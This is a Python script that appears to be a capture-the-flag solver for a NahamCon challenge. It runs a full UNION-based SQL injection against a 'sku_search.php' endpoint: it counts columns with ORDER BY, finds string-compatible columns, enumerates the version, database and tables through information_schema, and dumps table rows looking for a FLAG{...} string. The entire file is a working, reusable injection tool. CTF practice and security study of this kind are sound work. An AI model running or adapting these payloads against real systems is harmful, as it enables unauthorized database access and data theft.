import requests
import time
import re
import sys

# Target configuration
BASE_URL = "http://challenge.nahamcon.com:30640"
ENDPOINT = "/sku_search.php"
FULL_URL = BASE_URL + ENDPOINT

# Session cookie - will be automatically replaced
SESSION_COOKIE = "session=<dummy_session>"

def send_post(payload):
    """Send POST request to sku_search.php"""
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    if SESSION_COOKIE and SESSION_COOKIE != "session=<dummy_session>":
        headers["Cookie"] = SESSION_COOKIE
    
    data = {"search": payload}
    
    try:
        response = requests.post(FULL_URL, data=data, headers=headers, timeout=15, allow_redirects=False)
        return response
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

def find_column_count():
    """Step 1: Find column count using ORDER BY"""
    print("=" * 80)
    print("[*] STEP 1: Finding column count with ORDER BY")
    print("=" * 80)
    print("\n[*] Testing ORDER BY 1 through 20...\n")
    
    last_success = 0
    
    for i in range(1, 21):
        payload = f"test' ORDER BY {i}-- "
        print(f"  Testing ORDER BY {i:2d}... ", end="")
        
        response = send_post(payload)
        if not response:
            print("FAILED")
            continue
        
        # Check for SQL error indicators
        error_indicators = [
            "sql syntax", "mysql", "sql error", "database error",
            "invalid column", "unknown column", "operands in order clause"
        ]
        
        has_error = any(indicator in response.text.lower() for indicator in error_indicators)
        
        if has_error and i > 1:
            column_count = i - 1
            print(f"SQL ERROR (Column count: {column_count})")
            print(f"\n[+] COLUMN COUNT DETERMINED: {column_count}")
            print(f"    Last successful: ORDER BY {column_count}")
            print(f"    Failed at: ORDER BY {i}")
            return column_count
        else:
            print(f"OK (Status: {response.status_code})")
            last_success = i
        
        time.sleep(0.1)
    
    print(f"\n[-] No SQL error found in range 1-20")
    print(f"    Last successful: ORDER BY {last_success}")
    return last_success

def find_string_columns(column_count):
    """Step 2: Find which columns accept string data"""
    print("\n" + "=" * 80)
    print("[*] STEP 2: Finding string-compatible columns")
    print("=" * 80)
    print(f"\n[*] Testing {column_count} columns with UNION SELECT...\n")
    
    string_columns = []
    
    for pos in range(1, column_count + 1):
        # Create UNION query with 'test' in position 'pos'
        values = ["NULL"] * column_count
        values[pos - 1] = "'test'"  # String test value
        
        union_query = f"test' UNION SELECT {','.join(values)}-- "
        print(f"  Testing column {pos}: 'test' at position {pos}... ", end="")
        
        response = send_post(union_query)
        if not response:
            print("FAILED")
            continue
        
        if "test" in response.text:
            print(f"SUCCESS - String column found!")
            string_columns.append(pos)
            
            # Show context
            snippet_start = response.text.find("test")
            snippet = response.text[max(0, snippet_start-50):snippet_start+100]
            print(f"    Found 'test' in response near: ...{snippet}...")
        elif "sql syntax" in response.text.lower():
            print(f"SQL error (type mismatch)")
        else:
            print(f"No match (Status: {response.status_code})")
        
        time.sleep(0.1)
    
    print(f"\n[+] STRING-COMPATIBLE COLUMNS: {string_columns if string_columns else 'None found'}")
    return string_columns

def extract_database_info(column_count, string_column):
    """Step 3: Extract database information"""
    print("\n" + "=" * 80)
    print("[*] STEP 3: Enumerating database")
    print("=" * 80)
    
    # Build base UNION query template
    values = ["NULL"] * column_count
    values[string_column - 1] = "{data}"
    base_query = f"test' UNION SELECT {','.join(values)}-- "
    
    print(f"\n[*] Using column {string_column} for data extraction\n")
    
    # Get database version
    print("[1] Database version (@@version):")
    version_payload = base_query.format(data="@@version")
    response = send_post(version_payload)
    if response and response.status_code == 200:
        print(f"    Status: {response.status_code}")
        print(f"    Response:\n{response.text}")
    
    # Get current database name
    print("\n[2] Current database (database()):")
    db_payload = base_query.format(data="database()")
    response = send_post(db_payload)
    if response and response.status_code == 200:
        print(f"    Status: {response.status_code}")
        print(f"    Response:\n{response.text}")
    
    # Get all tables
    print("\n[3] All tables in current database:")
    tables_payload = base_query.format(data="(SELECT group_concat(table_name SEPARATOR ' | ') FROM information_schema.tables WHERE table_schema=database())")
    response = send_post(tables_payload)
    if response and response.status_code == 200:
        print(f"    Status: {response.status_code}")
        print(f"    Response:\n{response.text}")
        
        # Extract table names for further analysis
        table_match = re.search(r'([a-zA-Z0-9_| ]+)', response.text.strip())
        if table_match:
            raw_tables = table_match.group(1)
            tables = [t.strip() for t in raw_tables.split('|')]
            print(f"\n    Parsed tables: {tables}")
            return tables
    
    return []

def search_flag_tables(column_count, string_column):
    """Step 4: Search for tables containing 'flag'"""
    print("\n" + "=" * 80)
    print("[*] STEP 4: Searching for flag tables")
    print("=" * 80)
    
    # Build base UNION query
    values = ["NULL"] * column_count
    values[string_column - 1] = "{data}"
    base_query = f"test' UNION SELECT {','.join(values)}-- "
    
    print("\n[*] Querying for tables with 'flag' in name...\n")
    
    # Find flag-related tables
    flag_tables_payload = base_query.format(data="(SELECT group_concat(table_name SEPARATOR ' | ') FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%flag%')")
    response = send_post(flag_tables_payload)
    if response and response.status_code == 200:
        print(f"    Response:\n{response.text}")
        
        # Extract flag table names
        flag_tables = re.findall(r'([a-zA-Z0-9_]*flag[a-zA-Z0-9_]*)', response.text, re.I)
        if flag_tables:
            unique_flag_tables = list(set(flag_tables))
            print(f"\n[!] FLAG-RELATED TABLES FOUND: {unique_flag_tables}")
            return unique_flag_tables
        else:
            print("\n[-] No tables with 'flag' in name found")
    else:
        print("[-] Failed to query flag tables")
    
    return []

def extract_table_data(column_count, string_column, table_names):
    """Extract data from specified tables"""
    if not table_names:
        print("\n[-] No tables to extract data from")
        return
    
    print("\n" + "=" * 80)
    print("[*] EXTRACTING TABLE DATA")
    print("=" * 80)
    
    # Build base UNION query
    values = ["NULL"] * column_count
    values[string_column - 1] = "{data}"
    base_query = f"test' UNION SELECT {','.join(values)}-- "
    
    for table in table_names:
        print(f"\n[*] Table: {table}")
        
        # Get column names
        print(f"  [Columns] Querying column names...")
        columns_payload = base_query.format(data=f"(SELECT group_concat(column_name SEPARATOR ' | ') FROM information_schema.columns WHERE table_name='{table}')")
        response = send_post(columns_payload)
        if response and response.status_code == 200:
            print(f"    Response:\n{response.text}")
            
            # Extract column names
            columns = re.findall(r'([a-zA-Z0-9_]+)', response.text)
            print(f"    Parsed columns: {columns}")
        else:
            print(f"    Failed to get columns")
            continue
        
        # Extract all data (try different approaches)
        print(f"  [Data] Extracting table data...")
        
        # Approach 1: SELECT all columns
        if columns:
            cols_str = ','.join(columns)
            data_payload = base_query.format(data=f"(SELECT concat({cols_str}) FROM {table} LIMIT 5)")
        else:
            data_payload = base_query.format(data=f"(SELECT * FROM {table} LIMIT 5)")
        
        response = send_post(data_payload)
        if response and response.status_code == 200:
            print(f"    Response:\n{response.text}")
            
            # Look for FLAG pattern
            flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
            if flag_matches:
                print(f"\n[!] FLAGS FOUND in {table}: {flag_matches}")
                return flag_matches
        else:
            print(f"    Failed to extract data")
        
        time.sleep(0.2)
    
    return None

def main():
    """Main execution"""
    print("=" * 80)
    print("SQL INJECTION ENUMERATION - sku_search.php")
    print(f"Target: {FULL_URL}")
    print("=" * 80)
    print(f"Session: {SESSION_COOKIE}\n")
    
    # Step 1: Find column count
    column_count = find_column_count()
    if not column_count:
        print("\n[-] CRITICAL: Could not determine column count")
        sys.exit(1)
    
    # Step 2: Find string columns
    string_columns = find_string_columns(column_count)
    if not string_columns:
        print("\n[-] CRITICAL: No string-compatible columns found")
        sys.exit(1)
    
    # Use first string column for enumeration
    string_column = string_columns[0]
    print(f"\n[*] Using column {string_column} for database enumeration")
    
    # Step 3: Enumerate database (get all tables)
    all_tables = extract_database_info(column_count, string_column)
    
    # Step 4: Search for flag tables
    flag_tables = search_flag_tables(column_count, string_column)
    
    # Extract data from flag tables
    if flag_tables:
        flags = extract_table_data(column_count, string_column, flag_tables)
        if flags:
            print(f"\n" + "=" * 80)
            print(f"[!] SUCCESS: Flags extracted: {flags}")
            print("=" * 80)
            return
    
    # If no flag tables, try extracting from all tables
    if all_tables:
        print(f"\n[*] No flag tables found, trying all tables: {all_tables}")
        flags = extract_table_data(column_count, string_column, all_tables)
        if flags:
            print(f"\n" + "=" * 80)
            print(f"[!] SUCCESS: Flags extracted: {flags}")
            print("=" * 80)
            return
    
    print("\n" + "=" * 80)
    print("[-] ENUMERATION COMPLETE - No flags found")
    print("=" * 80)

if __name__ == "__main__":
    main()
